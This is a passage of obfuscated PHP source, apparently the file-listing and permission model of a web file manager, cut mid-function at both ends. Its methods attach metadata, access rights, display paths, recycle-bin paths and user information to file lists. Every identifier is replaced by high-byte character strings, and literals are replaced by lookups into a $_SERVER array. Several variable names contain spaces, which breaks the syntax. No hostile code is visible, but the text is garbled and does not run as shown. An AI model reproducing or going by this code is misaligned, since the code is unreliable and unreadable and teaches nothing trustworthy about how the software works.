_listFilterInfo(&$åéÍÔÛ², $¡Øò¶Ú = false) { $ò£™Ášş =& $_SERVER[Îûáû“ş]; foreach ($åéÍÔÛ² as &$·²üâˆ) { $·²üâˆ = $this->pathInfoFilter($·²üâˆ); self::$cachePathInfo[$ò£™Ášş[461] . intval($¡Øò¶Ú) . $ò£™Ášş[386] . $·²üâˆ[$ò£™Ášş[402]]] = $·²üâˆ; } unset($·²üâˆ); } protected function _listMake(&$ä´ıŞ‹) { $‹Ğ“èø =& $_SERVER[Îûáû“ş]; $ä´ıŞ‹[$‹Ğ“èø[82]] = array(); $ä´ıŞ‹[$‹Ğ“èø[83]] = array(); foreach ($ä´ıŞ‹[$‹Ğ“èø[369]] as $ËØÇáã) { $®İÚ·˜ù = $ËØÇáã[$‹Ğ“èø[410]] == 1 ? $‹Ğ“èø[82] : $‹Ğ“èø[83]; $ä´ıŞ‹[$®İÚ·˜ù][] = $ËØÇáã; } unset($ä´ıŞ‹[$‹Ğ“èø[369]]); } protected function _listAppendMeta(&$È—•áçâ, $Õ•Öš»®) { $ß©¶ªĞĞ =& $_SERVER[Îûáû“ş]; $ñƒ¯£¸½ = array($ß©¶ªĞĞ[417] => array($ß©¶ªĞĞ[418], $Õ•Öš»®)); $İêûæ€ = Model($ß©¶ªĞĞ[462])->field($ß©¶ªĞĞ[463])->where($ñƒ¯£¸½)->select(); if (!$İêûæ€) { return; } $ı¼‘ğÆ = array($ß©¶ªĞĞ[464], $ß©¶ªĞĞ[465], $ß©¶ªĞĞ[444]); $çªıéÂ† = array(); foreach ($İêûæ€ as $üè˜à¥ö) { if (!isset($çªıéÂ†[$üè˜à¥ö[$ß©¶ªĞĞ[402]]])) { $çªıéÂ†[$üè˜à¥ö[$ß©¶ªĞĞ[402]]] = array(); } if (in_array($üè˜à¥ö[$ß©¶ªĞĞ[94]], $ı¼‘ğÆ)) { continue; } $çªıéÂ†[$üè˜à¥ö[$ß©¶ªĞĞ[402]]][$üè˜à¥ö[$ß©¶ªĞĞ[94]]] = $üè˜à¥ö[$ß©¶ªĞĞ[374]]; } foreach ($È—•áçâ as &$‘£İô–˜) { $‘£İô–˜[$ß©¶ªĞĞ[466]] = !1; if (isset($çªıéÂ†[$‘£İô–˜[$ß©¶ªĞĞ[402]]])) { $‘£İô–˜[$ß©¶ªĞĞ[466]] = $çªıéÂ†[$‘£İô–˜[$ß©¶ªĞĞ[402]]]; } if ($this->fileIsLock($‘£İô–˜) && $‘£İô–˜[$ß©¶ªĞĞ[413]]) { $İÉü‰Éş = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‘£İô–˜[$ß©¶ªĞĞ[413]][$ß©¶ªĞĞ[414]] = AuthModel::authDisable($‘£İô–˜[$ß©¶ªĞĞ[413]][$ß©¶ªĞĞ[414]], $İÉü‰Éş); $‘£İô–˜[$ß©¶ªĞĞ[413]][$ß©¶ªĞĞ[467]][$ß©¶ªĞĞ[413]] = $‘£İô–˜[$ß©¶ªĞĞ[413]][$ß©¶ªĞĞ[414]]; } } unset($‘£İô–˜); } protected function _listAppendFileMeta(&$¾Ï„¦ú, $äÑ»›®›) { $úÈÁˆ =& $_SERVER[Îûáû“ş]; $á¯›Î…¯ = array_to_keyvalue($¾Ï„¦ú, $úÈÁˆ[12], $úÈÁˆ[468]); $á¯›Î…¯ = array_filter(array_unique($á¯›Î…¯)); if (!$á¯›Î…¯) { return; } $ Ëä¥–ñ = array($úÈÁˆ[469] => array($úÈÁˆ[418], $á¯›Î…¯)); $ã°ûûÇ˜ = $úÈÁˆ[470]; $€Œ¯ğ‡Ø = Model($úÈÁˆ[471])->field($ã°ûûÇ˜)->where($ Ëä¥–ñ)->select(); $€Œ¯ğ‡Ø = array_to_keyvalue($€Œ¯ğ‡Ø, $úÈÁˆ[468]); $»›ƒ–×á = Model($úÈÁˆ[472])->field($úÈÁˆ[473])->where($ Ëä¥–ñ)->select(); $»›ƒ–×á = $»›ƒ–×á ? $»›ƒ–×á : array(); $€ØÄ«ôØ = array(); foreach ($»›ƒ–×á as $³€ßÌò) { if (!isset($€ØÄ«ôØ[$³€ßÌò[$úÈÁˆ[468]]])) { $€ØÄ«ôØ[$³€ßÌò[$úÈÁˆ[468]]] = array(); } $€ØÄ«ôØ[$³€ßÌò[$úÈÁˆ[468]]][$³€ßÌò[$úÈÁˆ[94]]] = $³€ßÌò[$úÈÁˆ[374]]; } foreach ($¾Ï„¦ú as &$·©€ûî‹) { $ ü¡µ† = $·©€ûî‹[$úÈÁˆ[468]]; if (!$ ü¡µ† || !is_array($€Œ¯ğ‡Ø[$ ü¡µ†])) { continue; } $Ãˆá¸úñ = $€Œ¯ğ‡Ø[$ ü¡µ†]; $Ãˆá¸úñ[$úÈÁˆ[76]] = $·©€ûî‹[$úÈÁˆ[76]]; $Ãˆá¸úñ[$úÈÁˆ[32]] = $·©€ûî‹[$úÈÁˆ[32]]; if (!isset(self::$cacheFileInfo[$úÈÁˆ[474] . $ ü¡µ†])) { self::$cacheFileInfo[$úÈÁˆ[474] . $ ü¡µ†] = array_merge(array(), $Ãˆá¸úñ); } unset($€Œ¯ğ‡Ø[$ ü¡µ†][$úÈÁˆ[84]]); $§ïÎŸ…ª = is_array($€ØÄ«ôØ[$ ü¡µ†]) ? $€ØÄ«ôØ[$ ü¡µ†] : array(); $·©€ûî‹[$úÈÁˆ[170]] = array_merge($§ïÎŸ…ª, $€Œ¯ğ‡Ø[$ ü¡µ†]); if (isset($·©€ûî‹[$úÈÁˆ[170]][$úÈÁˆ[169]])) { $·©€ûî‹[$úÈÁˆ[169]] = json_decode($·©€ûî‹[$úÈÁˆ[170]][$úÈÁˆ[169]], !0); unset($·©€ûî‹[$úÈÁˆ[170]][$úÈÁˆ[169]]); } } unset($·©€ûî‹); } protected function _listAppendSourceInfo(&$ÇĞˆëÏÒ, $ÙÉïÖûœ) { $Âô¬òˆ‰ =& $_SERVER[Îûáû“ş]; $ÏìÀ´ÕÅ = Model($Âô¬òˆ‰[475])->listData(); $×«Ùôûñ = Model($Âô¬òˆ‰[425])->listData(); $ô‡Å½×¸ = Model($Âô¬òˆ‰[415])->listData(); $˜šëß­° = Model($Âô¬òˆ‰[476])->listSimple(); $µ¡¼¤§œ = array_to_keyvalue($ÏìÀ´ÕÅ, $Âô¬òˆ‰[399]); $îÛæÜ‹‡ = array_to_keyvalue_group($×«Ùôûñ, $Âô¬òˆ‰[84], $Âô¬òˆ‰[426]); $ŸßıÃÑÚ = array_to_keyvalue($ô‡Å½×¸, $Âô¬òˆ‰[84]); $òŞ­‚¹ş = array_to_keyvalue_group($˜šëß­°, $Âô¬òˆ‰[402]); foreach ($ÇĞˆëÏÒ as &$Î¥óÆõÀ) { $Î¥óÆõÀ[$Âô¬òˆ‰[87]] = array($Âô¬òˆ‰[477] => 0, $Âô¬òˆ‰[478] => 0, $Âô¬òˆ‰[479] => 0); if (isset($ŸßıÃÑÚ[$Î¥óÆõÀ[$Âô¬òˆ‰[402]]])) { $Î¥óÆõÀ[$Âô¬òˆ‰[87]][$Âô¬òˆ‰[480]] = 1; $Î¥óÆõÀ[$Âô¬òˆ‰[87]][$Âô¬òˆ‰[481]] = $ŸßıÃÑÚ[$Î¥óÆõÀ[$Âô¬òˆ‰[402]]][$Âô¬òˆ‰[32]]; } if ($îÛæÜ‹‡ && $µ¡¼¤§œ && isset($îÛæÜ‹‡[$Î¥óÆõÀ[$Âô¬òˆ‰[402]]])) { $Î¥óÆõÀ[$Âô¬òˆ‰[87]][$Âô¬òˆ‰[482]] = array(); foreach ($îÛæÜ‹‡[$Î¥óÆõÀ[$Âô¬òˆ‰[402]]] as $Ú©æ¬ˆ) { $ôòÒÀŠ = $µ¡¼¤§œ[$Ú©æ¬ˆ]; $Î¥óÆõÀ[$Âô¬òˆ‰[87]][$Âô¬òˆ‰[482]][] = array($Âô¬òˆ‰[483] => $ôòÒÀŠ[$Âô¬òˆ‰[399]], $Âô¬òˆ‰[420] => $ôòÒÀŠ[$Âô¬òˆ‰[32]], $Âô¬òˆ‰[484] => $ôòÒÀŠ[$Âô¬òˆ‰[485]]); } } if ($òŞ­‚¹ş && isset($òŞ­‚¹ş[$Î¥óÆõÀ[$Âô¬òˆ‰[402]]])) { $Î¥óÆõÀ[$Âô¬òˆ‰[87]][$Âô¬òˆ‰[486]] = array(); foreach ($òŞ­‚¹ş[$Î¥óÆõÀ[$Âô¬òˆ‰[402]]] as $İİ¬ô˜¦) { $·Ñ¸ÖÚË = $Âô¬òˆ‰[487]; if ($İİ¬ô˜¦[$Âô¬òˆ‰[488]] == $Âô¬òˆ‰[88]) { $·Ñ¸ÖÚË .= $Âô¬òˆ‰[489]; } $Î¥óÆõÀ[$Âô¬òˆ‰[87]][$Âô¬òˆ‰[486]] = array_field_key($İİ¬ô˜¦, explode($Âô¬òˆ‰[50], $·Ñ¸ÖÚË)); } } } unset($Î¥óÆõÀ); return $ÇĞˆëÏÒ; } protected function _listAppendChildren(&$ÕØ—Øá¢, $»êä”×) { $•”‡»±° =& $_SERVER[Îûáû“ş]; $³¨İæ§ß = array(); $­ÀÎÔÉÃ = array($•”‡»±°[207] => 0, $•”‡»±°[208] => 0); foreach ($ÕØ—Øá¢ as &$•»şª«ä) { if (!$•»şª«ä[$•”‡»±°[410]]) { continue; } $³¨İæ§ß[] = $•»şª«ä[$•”‡»±°[402]]; } unset($•»şª«ä); if (!$³¨İæ§ß) { return; } $“˜ß¶ÔØ = array($•”‡»±°[432] => array($•”‡»±°[7], $³¨İæ§ß), $•”‡»±°[431] => 0); $†à„›­ş = array($•”‡»±°[432], $•”‡»±°[410], $•”‡»±°[490] => $•”‡»±°[491]); $ÀûúÙ¥ = $this->field($†à„›­ş)->where($“˜ß¶ÔØ)->group($•”‡»±°[492])->select(); $ßüàÌ€ì = array(); foreach ($ÀûúÙ¥ as $Â”æùŒ) { $×Õ™ƒ§­ = $Â”æùŒ[$•”‡»±°[432]]; $¶¥¹ÂŠâ = $Â”æùŒ[$•”‡»±°[410]] == $•”‡»±°[88] ? $•”‡»±°[208] : $•”‡»±°[207]; if (!isset($ßüàÌ€ì[$×Õ™ƒ§­])) { $ßüàÌ€ì[$×Õ™ƒ§­] = array($•”‡»±°[207] => 0, $•”‡»±°[208] => 0); } $ßüàÌ€ì[$×Õ™ƒ§­][$¶¥¹ÂŠâ] += $Â”æùŒ[$•”‡»±°[491]]; } foreach ($ÕØ—Øá¢ as &$•»şª«ä) { if (!$•»şª«ä[$•”‡»±°[410]]) { continue; } $ÈÙã‹´· = is_array($ßüàÌ€ì[$•»şª«ä[$•”‡»±°[402]]]) ? $ßüàÌ€ì[$•»şª«ä[$•”‡»±°[402]]] : $­ÀÎÔÉÃ; $•»şª«ä[$•”‡»±°[208]] = $ÈÙã‹´·[$•”‡»±°[208]]; $•»şª«ä[$•”‡»±°[207]] = $ÈÙã‹´·[$•”‡»±°[207]]; unset($•»şª«ä[$•”‡»±°[412]]); } unset($•»şª«ä); } protected function _listAppendAuth(&$ˆÑ¿ùñË) { $ÑÖŒØş¬ =& $_SERVER[Îûáû“ş]; $ì¡µå‘ = array(); foreach ($ˆÑ¿ùñË as $–ˆ¬Ê¯) { if ($–ˆ¬Ê¯[$ÑÖŒØş¬[411]] == self::TYPE_GROUP) { $ì¡µå‘[] = $–ˆ¬Ê¯[$ÑÖŒØş¬[402]]; } } if (!$ì¡µå‘) { return; } $ÓîÚ‹ù = array_to_keyvalue($ˆÑ¿ùñË, $ÑÖŒØş¬[402]); $«¸²Ó = Model($ÑÖŒØş¬[493])->getSourceList($ì¡µå‘, $ÓîÚ‹ù); $´ß¹÷ù› = $GLOBALS[$ÑÖŒØş¬[494]] == 1; foreach ($ˆÑ¿ùñË as $”úÃì÷ => &$–ˆ¬Ê¯) { $–ˆ¬Ê¯[$ÑÖŒØş¬[413]] = $«¸²Ó[$–ˆ¬Ê¯[$ÑÖŒØş¬[402]]]; if (!$–ˆ¬Ê¯[$ÑÖŒØş¬[413]] && $–ˆ¬Ê¯[$ÑÖŒØş¬[411]] == self::TYPE_GROUP) { $–ˆ¬Ê¯[$ÑÖŒØş¬[413]] = Action($ÑÖŒØş¬[495])->pathGroupAuthMake($–ˆ¬Ê¯[$ÑÖŒØş¬[496]]); if (!$–ˆ¬Ê¯[$ÑÖŒØş¬[413]] && !$´ß¹÷ù›) { $–ˆ¬Ê¯[$ÑÖŒØş¬[203]] = !1; $–ˆ¬Ê¯[$ÑÖŒØş¬[202]] = !1; } } if ($–ˆ¬Ê¯[$ÑÖŒØş¬[413]]) { $–ˆ¬Ê¯[$ÑÖŒØş¬[203]] = AuthModel::authCheckEdit($–ˆ¬Ê¯[$ÑÖŒØş¬[413]][$ÑÖŒØş¬[414]]); $–ˆ¬Ê¯[$ÑÖŒØş¬[202]] = AuthModel::authCheckView($–ˆ¬Ê¯[$ÑÖŒØş¬[413]][$ÑÖŒØş¬[414]]); } $this->groupPathDisplay($–ˆ¬Ê¯); } unset($–ˆ¬Ê¯); } public function _listAppendAuthSecret(&$–Äêö¸Œ) { $Ÿ²ŠĞä³ =& $_SERVER[Îûáû“ş]; if (Model($Ÿ²ŠĞä³[435])->get($Ÿ²ŠĞä³[497]) != $Ÿ²ŠĞä³[88]) { return; } static $¤„šÂ¤Ÿ = false; if (!$¤„šÂ¤Ÿ) { $Ô­‚‰Ï¿ = Model($Ÿ²ŠĞä³[498]); $ÒÇİ÷Óâ = Model($Ÿ²ŠĞä³[499]); $¤„šÂ¤Ÿ = $ÒÇİ÷Óâ->listData(); $¤„šÂ¤Ÿ = array_to_keyvalue($¤„šÂ¤Ÿ, $Ÿ²ŠĞä³[402]); $ªĞ„´‚å = json_decode(Model($Ÿ²ŠĞä³[435])->get($Ÿ²ŠĞä³[500]), !0); $ªĞ„´‚å = array_to_keyvalue($ªĞ„´‚å, $Ÿ²ŠĞä³[399]); foreach ($¤„šÂ¤Ÿ as $éÊ‡ÅœÏ => $¾ó¹È¹µ) { $ÅòÜ¡Ä‹ = $ªĞ„´‚å[$¾ó¹È¹µ[$Ÿ²ŠĞä³[501]]]; if (!$ÅòÜ¡Ä‹) { $ÒÇİ÷Óâ->remove($¾ó¹È¹µ[$Ÿ²ŠĞä³[399]]); unset($¤„šÂ¤Ÿ[$éÊ‡ÅœÏ]); continue; } $õ»¹„÷ = $Ô­‚‰Ï¿->listData($ÅòÜ¡Ä‹[$Ÿ²ŠĞä³[413]]); if (!$õ»¹„÷) { $ÒÇİ÷Óâ->remove($¾ó¹È¹µ[$Ÿ²ŠĞä³[399]]); unset($¤„šÂ¤Ÿ[$éÊ‡ÅœÏ]); continue; } $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]] = $õ»¹„÷; $¾ó¹È¹µ[$Ÿ²ŠĞä³[502]] = $ÅòÜ¡Ä‹; $¾ó¹È¹µ[$Ÿ²ŠĞä³[503]] = Model($Ÿ²ŠĞä³[504])->getInfoSimpleOuter($¾ó¹È¹µ[$Ÿ²ŠĞä³[454]]); $¤„šÂ¤Ÿ[$éÊ‡ÅœÏ] = $¾ó¹È¹µ; } } $ŞÌ…ÙÂØ = USER_ID; $¦ˆä¦£Í = array(); $ªĞËœúë = $this->_listAppendPath($¦ˆä¦£Í, !0); foreach ($–Äêö¸Œ as $éÊ‡ÅœÏ => &$¾ó¹È¹µ) { if (!is_array($¾ó¹È¹µ[$Ÿ²ŠĞä³[413]])) { continue; } if ($¾ó¹È¹µ[$Ÿ²ŠĞä³[411]] != $Ÿ²ŠĞä³[505]) { continue; } if (isset($¤„šÂ¤Ÿ[$¾ó¹È¹µ[$Ÿ²ŠĞä³[402]]])) { $Ä·Îşî£ = $¤„šÂ¤Ÿ[$¾ó¹È¹µ[$Ÿ²ŠĞä³[402]]]; if (!is_array($¾ó¹È¹µ[$Ÿ²ŠĞä³[466]])) { $¾ó¹È¹µ[$Ÿ²ŠĞä³[466]] = array(); } $¾ó¹È¹µ[$Ÿ²ŠĞä³[466]][$Ÿ²ŠĞä³[506]] = $Ä·Îşî£[$Ÿ²ŠĞä³[501]]; $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[507]] = $Ä·Îşî£; $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[508]] = $¾ó¹È¹µ[$Ÿ²ŠĞä³[509]]; $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[510]] = $Ÿ²ŠĞä³[88]; if ($Ä·Îşî£[$Ÿ²ŠĞä³[454]] != $ŞÌ…ÙÂØ) { $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[414]] = $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[414]] & $Ä·Îşî£[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[413]]; } continue; } $ÙÑ¦ÓÅ = $this->parentLevelArray($¾ó¹È¹µ[$Ÿ²ŠĞä³[511]]); $‘€Ÿ§¶¼ = array_reverse($ÙÑ¦ÓÅ); foreach ($‘€Ÿ§¶¼ as $³¡çÎÊş => $¦Î«—ñÖ) { if (!isset($¤„šÂ¤Ÿ[$¦Î«—ñÖ])) { continue; } $Ä·Îşî£ = $¤„šÂ¤Ÿ[$¦Î«—ñÖ]; $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[507]] = $Ä·Îşî£; if ($Ä·Îşî£[$Ÿ²ŠĞä³[454]] != $ŞÌ…ÙÂØ) { $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[414]] = $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[414]] & $Ä·Îşî£[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[413]]; } $¶¾Úƒ— = $Ÿ²ŠĞä³[12]; $Âåã¾ç = count($ÙÑ¦ÓÅ) - $³¡çÎÊş; for ($šİ²¼Ò  = 0; $šİ²¼Ò  < $Âåã¾ç; $šİ²¼Ò ++) { if (!isset($ªĞËœúë[$ÙÑ¦ÓÅ[$šİ²¼Ò ]])) { $¶¾Úƒ— = $Ÿ²ŠĞä³[12]; break; } $¶¾Úƒ— = $¶¾Úƒ— . rtrim($ªĞËœúë[$ÙÑ¦ÓÅ[$šİ²¼Ò ]], $Ÿ²ŠĞä³[8]) . $Ÿ²ŠĞä³[8]; } $¾ó¹È¹µ[$Ÿ²ŠĞä³[413]][$Ÿ²ŠĞä³[508]] = rtrim($¶¾Úƒ—, $Ÿ²ŠĞä³[8]) . $Ÿ²ŠĞä³[8]; break; } } unset($¾ó¹È¹µ); } public function groupPathDisplay(&$‰ÃÈÕ¸Î) { $Ö†Ë©†Ì =& $_SERVER[Îûáû“ş]; if ($‰ÃÈÕ¸Î[$Ö†Ë©†Ì[411]] != self::TYPE_GROUP) { return; } $áßØ„ëª = Model($Ö†Ë©†Ì[512])->getInfo($‰ÃÈÕ¸Î[$Ö†Ë©†Ì[496]]); $ú¹ŞÙ’ó = $this->parentLevelArray($áßØ„ëª[$Ö†Ë©†Ì[511]]); $‚¦ƒ°†µ = $Ö†Ë©†Ì[12]; foreach ($ú¹ŞÙ’ó as $É¸•³˜£) { $Äª¨Îé = Model($Ö†Ë©†Ì[512])->getInfo($É¸•³˜£); $‚¦ƒ°†µ .= $Äª¨Îé[$Ö†Ë©†Ì[87]][$Ö†Ë©†Ì[402]] . $Ö†Ë©†Ì[50]; } $‰ÃÈÕ¸Î[$Ö†Ë©†Ì[513]] = $áßØ„ëª[$Ö†Ë©†Ì[432]]; $‰ÃÈÕ¸Î[$Ö†Ë©†Ì[514]] = $áßØ„ëª[$Ö†Ë©†Ì[511]]; $‰ÃÈÕ¸Î[$Ö†Ë©†Ì[515]] = $áßØ„ëª[$Ö†Ë©†Ì[516]]; $‰ÃÈÕ¸Î[$Ö†Ë©†Ì[517]] = $‚¦ƒ°†µ . $áßØ„ëª[$Ö†Ë©†Ì[87]][$Ö†Ë©†Ì[402]]; } protected function _listAppendPath(&$æõªí©¢, $Â¿•Øé‘ = false) { $ìé’Ç„Ú =& $_SERVER[Îûáû“ş]; static $õ¹ÒªŞÃ = array(); $ş®­è = array(); $ãĞŒó†Ÿ = array(); if ($Â¿•Øé‘) { return $õ¹ÒªŞÃ; } foreach ($æõªí©¢ as &$íÏŞşöË) { $ëíÙİáÃ = $íÏŞşöË[$ìé’Ç„Ú[402]]; if ($íÏŞşöË[$ìé’Ç„Ú[410]] == $ìé’Ç„Ú[88] && $íÏŞşöË[$ìé’Ç„Ú[432]] != 0) { $õ¹ÒªŞÃ[$ëíÙİáÃ] = $íÏŞşöË[$ìé’Ç„Ú[32]]; } if ($íÏŞşöË[$ìé’Ç„Ú[410]] == $ìé’Ç„Ú[88] && $íÏŞşöË[$ìé’Ç„Ú[432]] == 0 && !isset($õ¹ÒªŞÃ[$ëíÙİáÃ])) { $õ¹ÒªŞÃ[$ëíÙİáÃ] = $this->_listAppendPathRoot($íÏŞşöË, array()); } if (isset($ãĞŒó†Ÿ[$íÏŞşöË[$ìé’Ç„Ú[511]]])) { continue; } $ãĞŒó†Ÿ[$íÏŞşöË[$ìé’Ç„Ú[511]]] = !0; $Æ´°”÷ = $this->parentLevelArray($íÏŞşöË[$ìé’Ç„Ú[511]]); foreach ($Æ´°”÷ as $ÅÇ™ô¸Ã => $Ğ‘íßœá) { if (isset($õ¹ÒªŞÃ[$Ğ‘íßœá])) { continue; } if ($ÅÇ™ô¸Ã == 0) { $õ¹ÒªŞÃ[$Ğ‘íßœá] = $this->_listAppendPathRoot($íÏŞşöË, $Æ´°”÷); } if ($ÅÇ™ô¸Ã != 0) { $ş®­è[] = $Ğ‘íßœá; } } } unset($íÏŞşöË); $ş®­è = array_unique($ş®­è); if (count($ş®­è) > 0) { $À®ØÑ°› = array($ìé’Ç„Ú[417] => array($ìé’Ç„Ú[418], $ş®­è)); if (count($ş®­è) == 1) { $¥Ïî¯ƒ = $this->sourceInfo($ş®­è[0]); $ğëÆÙ® = is_array($¥Ïî¯ƒ) ? array($¥Ïî¯ƒ) : !1; } else { $ğëÆÙ® = $this->field($ìé’Ç„Ú[518])->where($À®ØÑ°›)->select(); } if (!$ğëÆÙ®) { $ğëÆÙ® = array(); } foreach ($ğëÆÙ® as $Æğ‰«“ª) { $õ¹ÒªŞÃ[$Æğ‰«“ª[$ìé’Ç„Ú[402]]] = $Æğ‰«“ª[$ìé’Ç„Ú[32]]; } } $´…Ğï¤ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¿Ì¹¡Ä× = array(); foreach ($æõªí©¢ as &$íÏŞşöË) { $´ ü¥™á = $íÏŞşöË[$ìé’Ç„Ú[511]]; $İĞ¹­¢  = $ìé’Ç„Ú[12]; if (isset($¿Ì¹¡Ä×[$´ ü¥™á])) { $İĞ¹­¢  = $¿Ì¹¡Ä×[$´ ü¥™á]; } else { $Æ´°”÷ = $this->parentLevelArray($íÏŞşöË[$ìé’Ç„Ú[511]]); foreach ($Æ´°”÷ as $ÅÇ™ô¸Ã => $Ğ‘íßœá) { if (isset($õ¹ÒªŞÃ[$Ğ‘íßœá])) { $İĞ¹­¢  .= $õ¹ÒªŞÃ[$Ğ‘íßœá] . $ìé’Ç„Ú[8]; } } $¿Ì¹¡Ä×[$´ ü¥™á] = $İĞ¹­¢ ; } $İĞ¹­¢  .= $íÏŞşöË[$ìé’Ç„Ú[32]]; if ($íÏŞşöË[$ìé’Ç„Ú[410]] == $ìé’Ç„Ú[88]) { $İĞ¹­¢  .= $ìé’Ç„Ú[8]; } $íÏŞşöË[$ìé’Ç„Ú[509]] = str_replace($ìé’Ç„Ú[519], $ìé’Ç„Ú[8], $İĞ¹­¢ ); if ($íÏŞşöË[$ìé’Ç„Ú[432]] == $ìé’Ç„Ú[198]) { $íÏŞşöË[$ìé’Ç„Ú[32]] = trim($õ¹ÒªŞÃ[$íÏŞşöË[$ìé’Ç„Ú[402]]], $ìé’Ç„Ú[8]); $íÏŞşöË[$ìé’Ç„Ú[509]] = $íÏŞşöË[$ìé’Ç„Ú[32]] . $ìé’Ç„Ú[8]; } if (intval($íÏŞşöË[$ìé’Ç„Ú[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($íÏŞşöË, $Æ´°”÷, $´…Ğï¤); } } unset($íÏŞşöË); return $æõªí©¢; } private function _listAppendPathRecycle(&$—¼ûøò, $Ù±­ôŒ, $Üù’šÓ‘) { $Öæ×Şõã =& $_SERVER[Îûáû“ş]; if (!in_array($Üù’šÓ‘, $Ù±­ôŒ) && $—¼ûøò[$Öæ×Şõã[402]] != $Üù’šÓ‘) { return; } $¨à’úÚ = explode($Öæ×Şõã[8], trim($—¼ûøò[$Öæ×Şõã[509]], $Öæ×Şõã[8])); $Šú¨¾˜Ä = implode($Öæ×Şõã[8], array_slice($¨à’úÚ, 2)); $—¼ûøò[$Öæ×Şõã[509]] = $Öæ×Şõã[8] . LNG($Öæ×Şõã[520]) . $Öæ×Şõã[8] . ltrim($Šú¨¾˜Ä, $Öæ×Şõã[8]); $—¼ûøò[$Öæ×Şõã[511]] = $Öæ×Şõã[521] . implode($Öæ×Şõã[50], array_slice($Ù±­ôŒ, 1)) . $Öæ×Şõã[50]; if ($—¼ûøò[$Öæ×Şõã[402]] == $Üù’šÓ‘) { $—¼ûøò[$Öæ×Şõã[511]] = $Öæ×Şõã[521]; $—¼ûøò[$Öæ×Şõã[432]] = $Öæ×Şõã[198]; $—¼ûøò[$Öæ×Şõã[32]] = LNG($Öæ×Şõã[520]); } $—¼ûøò[$Öæ×Şõã[522]] = $Öæ×Şõã[523]; } protected function _listAppendPathRoot(&$¹ò‰÷»ä, $¸›ñ•Å) { $ñÇ¡“Î =& $_SERVER[Îûáû“ş]; static $³šŸå«ì = false; $÷ÎšÂ²Ü = $ñÇ¡“Î[12]; if ($¹ò‰÷»ä[$ñÇ¡“Î[411]] == self::TYPE_USER) { if ($¹ò‰÷»ä[$ñÇ¡“Î[496]] == USER_ID) { $÷ÎšÂ²Ü = LNG($ñÇ¡“Î[524]); if ($³šŸå«ì === !1) { $“¢ÆµÈË = Model($ñÇ¡“Î[525])->getInfoFull(USER_ID); $³šŸå«ì = _get($“¢ÆµÈË, $ñÇ¡“Î[526], $ñÇ¡“Î[12]); } if ($¸›ñ•Å && $¸›ñ•Å[0] == $³šŸå«ì || !$¸›ñ•Å && $¹ò‰÷»ä[$ñÇ¡“Î[402]] == $³šŸå«ì) { $÷ÎšÂ²Ü = LNG($ñÇ¡“Î[527]); $¹ò‰÷»ä[$ñÇ¡“Î[528]] = $ñÇ¡“Î[529]; } if (!$¸›ñ•Å) { $¹ò‰÷»ä[$ñÇ¡“Î[32]] = $÷ÎšÂ²Ü; } } else { $’ıñÈª = Model($ñÇ¡“Î[504])->getInfoSimple($¹ò‰÷»ä[$ñÇ¡“Î[496]]); $÷ÎšÂ²Ü = LNG($ñÇ¡“Î[530]) . $ñÇ¡“Î[162] . $’ıñÈª[$ñÇ¡“Î[32]] . $ñÇ¡“Î[164]; $¹ò‰÷»ä[$ñÇ¡“Î[531]] = array($ñÇ¡“Î[32] => $’ıñÈª[$ñÇ¡“Î[32]], $ñÇ¡“Î[532] => $’ıñÈª[$ñÇ¡“Î[532]], $ñÇ¡“Î[533] => $’ıñÈª[$ñÇ¡“Î[533]]); } } else { if ($¹ò‰÷»ä[$ñÇ¡“Î[411]] == self::TYPE_GROUP) { $’ıñÈª = Model($ñÇ¡“Î[512])->getInfoSimple($¹ò‰÷»ä[$ñÇ¡“Î[496]]); $÷ÎšÂ²Ü = $’ıñÈª[$ñÇ¡“Î[32]]; } else { if ($¹ò‰÷»ä[$ñÇ¡“Î[411]] == self::TYPE_SYSTEM) { $÷ÎšÂ²Ü = $ñÇ¡“Î[534]; } } } $÷ÎšÂ²Ü = $÷ÎšÂ²Ü ? $ñÇ¡“Î[8] . $÷ÎšÂ²Ü . $ñÇ¡“Î[8] : $ñÇ¡“Î[8]; return $÷ÎšÂ²Ü; } protected function _listAppendUser(&$ü¿®àÈÎ) { $…ˆû£°÷ =& $_SERVER[Îûáû“ş]; $ù½ÌÍè‡ = array_to_keyvalue($ü¿®àÈÎ, $…ˆû£°÷[12], $…ˆû£°÷[454]); $¥½ìŠ¹Ú = array_to_keyvalue($ü¿®àÈÎ, $…ˆû£°÷[12], $…ˆû£°÷[456]); $Û—ï‡ë = array_merge($ù½ÌÍè‡, $¥½ìŠ¹Ú); $äíŞØ«Ü = Model($…ˆû£°÷[525])->userListInfo($Û—ï‡ë); foreach ($ü¿®àÈÎ as &$úŸ°æ×«) { $ãû±õÍÊ = $úŸ°æ×«[$…ˆû£°÷[454]]; $úŸ°æ×«[$…ˆû£°÷[454]] = $äíŞØ«Ü[$ãû±õÍÊ] ? $äíŞØ«Ü[$ãû±õÍÊ] : !1; $ãû±õÍÊ = $úŸ°æ×«[$…ˆû£°÷[456]]; $úŸ°æ×«[$…ˆû£°÷[456]] = $äíŞØ«Ü[$ãû±õÍÊ] ? $äíŞØ«Ü[$ãû±õÍÊ] : !1; if (isset($úŸ°æ×«[$…ˆû£°÷[466]]) && $úŸ°æ×«[$…ˆû£°÷[466]][$…ˆû£°÷[535]]) { $şñÇü˜ = $GLOBALS[$…ˆû£°÷[6]][$…ˆû£°÷[89]][$…ˆû£°÷[536]]; if ($úŸ°æ×«[$…ˆû£°÷[466]][$…ˆû£°÷[537]] <= time() - $şñÇü˜) { $this->metaSet($úŸ°æ×«[$…ˆû£°÷[402]], $…ˆû£°÷[535], null); $this->metaSet($úŸ°æ×«[$…ˆû£°÷[402]], $…ˆû£°÷[537], null); 